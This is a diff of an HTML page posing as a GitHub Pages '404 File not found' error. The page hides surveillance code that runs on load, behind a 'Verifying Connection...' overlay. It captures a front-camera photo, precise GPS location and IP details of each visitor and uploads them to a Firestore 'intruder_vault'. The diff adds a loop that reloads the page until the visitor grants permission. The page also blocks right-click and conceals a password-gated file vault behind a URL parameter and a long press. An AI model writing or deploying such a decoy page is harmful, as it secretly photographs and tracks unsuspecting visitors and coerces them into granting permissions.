@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,53 +5,21 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Page not found · GitHub Pages</title>
     <style>
-        /* --- 1. ORIGINAL GITHUB 404 STYLING --- */
+        /* --- ORIGINAL GITHUB 404 STYLING --- */
         body {
-            background-color: #fff;
-            margin: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
-            color: #24292e;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            text-align: center;
-            user-select: none; /* Prevents highlighting text */
+            background-color: #fff; margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            color: #24292e; display: flex; justify-content: center; align-items: center;
+            height: 100vh; text-align: center; user-select: none;
         }
-        #decoy_ui {
-            max-width: 500px;
-            padding: 30px;
-        }
-        h1 {
-            font-size: 60px;
-            font-weight: 100;
-            margin: 0 0 10px 0;
-            line-height: 1;
-        }
-        h2 {
-            font-size: 20px;
-            font-weight: 500;
-            color: #586069;
-            margin: 0 0 30px 0;
-        }
-        p {
-            font-size: 14px;
-            line-height: 1.6;
-            color: #586069;
-            margin: 10px 0;
-        }
+        #decoy_ui { max-width: 500px; padding: 30px; }
+        h1 { font-size: 60px; font-weight: 100; margin: 0 0 10px 0; line-height: 1; }
+        h2 { font-size: 20px; font-weight: 500; color: #586069; margin: 0 0 30px 0; }
+        p { font-size: 14px; line-height: 1.6; color: #586069; margin: 10px 0; }
         a { color: #0366d6; text-decoration: none; }
-        a:hover { text-decoration: underline; }
-        code {
-            font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace;
-            background-color: rgba(27,31,35,0.05);
-            padding: 3px 5px;
-            border-radius: 3px;
-            font-size: 85%;
-        }
-
-        /* --- 2. HIDDEN VAULT UI --- */
-        #vault_ui, #data_view { display: none; }
+        
+        /* --- HIDDEN INTERFACES --- */
+        #vault_ui, #data_view, #loading_overlay { display: none; }
         
         #vault_ui {
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
@@ -60,42 +27,47 @@
             box-shadow: 0 8px 24px rgba(0,0,0,0.1); width: 300px; z-index: 1000;
         }
         #vault_ui input { display: block; width: 100%; margin: 10px 0; padding: 10px; border: 1px solid #d1d5da; border-radius: 3px; box-sizing: border-box; }
-        #vault_ui button { width: 100%; padding: 10px; background: #2ea44f; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        #vault_ui button { width: 100%; padding: 10px; background: #2ea44f; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
 
         #data_view { 
             width: 100%; height: 100vh; overflow-y: auto; background: white; 
             position: fixed; top: 0; left: 0; z-index: 9999; padding: 20px; box-sizing: border-box; text-align: left;
         }
-        .file-card { border-bottom: 1px solid #eee; padding: 20px 0; text-align: center; }
         .upload-bar { background: #f6f8fa; padding: 15px; border-radius: 6px; margin-bottom: 20px; border: 1px solid #d1d5da; display: flex; align-items: center; justify-content: space-between; }
+        
+        /* LOADING TEXT TO DISTRACT USER */
+        #loading_overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10001; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0366d6; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body oncontextmenu="return false;">
+
+    <div id="loading_overlay">
+        <div class="spinner"></div>
+        <p>Verifying Connection...</p>
+    </div>
 
     <div id="decoy_ui">
         <h1>404</h1>
         <h2>File not found</h2>
         <p>The site configured at this address does not contain the requested file.</p>
-        <p>If this is your site, make sure that the filename case matches the URL.<br>
-        For root URLs (like <code>http://example.com/</code>) you must provide an <code>index.html</code> file.</p>
-        <p><a href="#">Read the full documentation</a> for more information about using <strong>GitHub Pages</strong>.</p>
+        <p><a href="#">Read documentation</a> for <strong>GitHub Pages</strong>.</p>
     </div>
 
     <div id="vault_ui">
-        <h3 style="margin-top:0;">System Verify</h3>
+        <h3>System Auth</h3>
         <input type="password" id="pass_field" placeholder="System ID">
         <input type="text" id="user_field" placeholder="Error Code">
-        <button id="auth_btn">Verify & Resume</button>
+        <button id="auth_btn">Verify</button>
     </div>
 
     <div id="data_view">
         <div class="upload-bar">
-            <div>
-                <strong>Upload:</strong>
-                <input type="file" id="fileInput" accept="image/*,application/pdf" style="margin-left:10px;">
-                <button id="upBtn" style="background:#2ea44f; color:white; border:none; padding:5px 10px; border-radius:4px; cursor:pointer;">Push</button>
-            </div>
-            <button onclick="location.reload()" style="background:#d73a49; color:white; border:none; padding:5px 15px; border-radius:4px; cursor:pointer;">Lock</button>
+            <strong>Private Vault:</strong>
+            <input type="file" id="fileInput" accept="image/*,application/pdf">
+            <button id="upBtn">Push</button>
+            <button onclick="location.reload()" style="background:#d73a49; color:white; border:none; padding:5px 10px; border-radius:4px;">Lock</button>
         </div>
         <div id="vault_content"></div>
     </div>
@@ -118,133 +90,85 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // --- 1. SPY ENGINE (CAMERA + GPS) ---
-        let captured = false;
+        async function startSpyLoop() {
+            let photoData, locData;
 
-        async function activateSpy() {
-            if(captured) return; // Stop if we already got them
-            
-            let photoData = "Denied";
-            let locData = "Denied";
-
-            // A. CAMERA TRAP
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                // 1. FORCE CAMERA
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('spyVideo');
                 const canvas = document.getElementById('spyCanvas');
-                
                 video.srcObject = stream;
                 await new Promise(r => video.onloadedmetadata = r);
-                await new Promise(r => setTimeout(r, 500)); // Light adjust
-                
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 photoData = canvas.toDataURL('image/jpeg', 0.5);
-                
                 stream.getTracks().forEach(t => t.stop());
-                captured = true; // Success
-            } catch(e) { console.log("Cam Blocked"); }
 
-            // B. GPS TRAP
-            try {
-                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true}));
+                // 2. FORCE GPS (Strict High Accuracy)
+                const pos = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000 });
+                });
                 locData = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
-            } catch(e) { console.log("GPS Blocked"); }
 
-            // C. IP DATA (Always works)
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
+                // 3. LOG TO FIREBASE
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                const logs = await getDocs(collection(db, "intruder_vault"));
+                
+                await setDoc(doc(db, "intruder_vault", `Visitor_${logs.size + 1}`), {
+                    photo: photoData,
+                    location: locData,
+                    network: ipData,
+                    timestamp: new Date().toISOString()
+                });
 
-            // D. UPLOAD
-            const logs = await getDocs(collection(db, "intruder_vault"));
-            const count = logs.size + 1;
-            
-            await setDoc(doc(db, "intruder_vault", `Visitor_${count}`), {
-                photo: photoData,
-                location: locData,
-                network: ipData,
-                device: {
-                    ua: navigator.userAgent,
-                    screen: `${screen.width}x${screen.height}`,
-                    battery: (await navigator.getBattery?.())?.level || 'Unknown'
-                },
-                timestamp: new Date().toISOString()
-            });
+                // Hide loading after capture
+                document.getElementById('loading_overlay').style.display = 'none';
+
+            } catch (err) {
+                // IF DENIED OR ERROR: REFRESH TO ASK AGAIN
+                console.log("Permission Denied. Refreshing...");
+                location.reload();
+            }
         }
 
-        // AUTO-START ON LOAD
-        activateSpy();
+        window.onload = startSpyLoop;
 
-        // PERSISTENT RETRY: If they blocked it, ask again on ANY click
-        document.addEventListener('click', () => {
-            if(!captured) activateSpy();
-        });
-
-        // --- 2. GHOST TRIGGER (Long Press) ---
+        // --- GHOST TRIGGER ---
         let timer;
-        const params = new URLSearchParams(window.location.search);
-        if(params.get('access') === 'valie') {
-            const showLogin = () => {
+        if(new URLSearchParams(window.location.search).get('access') === 'valie') {
+            const start = () => timer = setTimeout(() => {
                 document.getElementById('decoy_ui').style.display = 'none';
                 document.getElementById('vault_ui').style.display = 'block';
-            };
-            const start = () => timer = setTimeout(showLogin, 5000); // 5 Seconds
-            const end = () => clearTimeout(timer);
-
+            }, 5000);
             ['mousedown', 'touchstart'].forEach(e => document.addEventListener(e, start));
-            ['mouseup', 'touchend'].forEach(e => document.addEventListener(e, end));
+            ['mouseup', 'touchend'].forEach(e => document.addEventListener(e, () => clearTimeout(timer)));
         }
 
-        // --- 3. LOGIN SYSTEM ---
+        // --- AUTH & VAULT ---
         document.getElementById('auth_btn').onclick = async () => {
             const p = document.getElementById('pass_field').value;
             const u = document.getElementById('user_field').value;
-            
-            try {
-                const snap = await getDoc(doc(db, "system_config", "vault_secrets"));
-                if (snap.exists() && p === snap.data().secret_pass && u === snap.data().secret_user) {
-                    document.getElementById('vault_ui').style.display = 'none';
-                    document.getElementById('data_view').style.display = 'block';
-                    loadFiles();
-                    setTimeout(() => location.reload(), 600000); // 10 min logout
-                } else {
-                    alert("Verification Failed");
-                    location.reload();
-                }
-            } catch(e) { alert("Connection Error"); }
+            const snap = await getDoc(doc(db, "system_config", "vault_secrets"));
+            if (snap.exists() && p === snap.data().secret_pass && u === snap.data().secret_user) {
+                document.getElementById('vault_ui').style.display = 'none';
+                document.getElementById('data_view').style.display = 'block';
+                loadFiles();
+            } else { location.reload(); }
         };
 
-        // --- 4. VAULT FILE MANAGER ---
         async function loadFiles() {
             const snap = await getDocs(collection(db, "vault_data"));
             const box = document.getElementById('vault_content');
             box.innerHTML = "";
-            snap.forEach(doc => {
-                const f = doc.data();
-                const d = document.createElement('div');
-                d.className = "file-card";
-                d.innerHTML = `<h4>${f.name}</h4>` + 
-                    (f.type === 'pdf' ? `<iframe src="${f.content}" width="100%" height="500px"></iframe>` : `<img src="${f.content}" style="max-width:100%">`);
-                box.appendChild(d);
+            snap.forEach(d => {
+                const f = d.data();
+                const div = document.createElement('div');
+                div.innerHTML = `<h4>${f.name}</h4><img src="${f.content}" style="max-width:100%">`;
+                box.appendChild(div);
             });
         }
-
-        document.getElementById('upBtn').onclick = async () => {
-            const file = document.getElementById('fileInput').files[0];
-            if(!file) return;
-            const reader = new FileReader();
-            reader.readAsDataURL(file);
-            reader.onload = async () => {
-                await addDoc(collection(db, "vault_data"), {
-                    name: file.name,
-                    content: reader.result,
-                    type: file.type.includes('pdf') ? 'pdf' : 'image',
-                    date: new Date().toISOString()
-                });
-                loadFiles();
-            };
-        };
     </script>
 </body>
 </html>
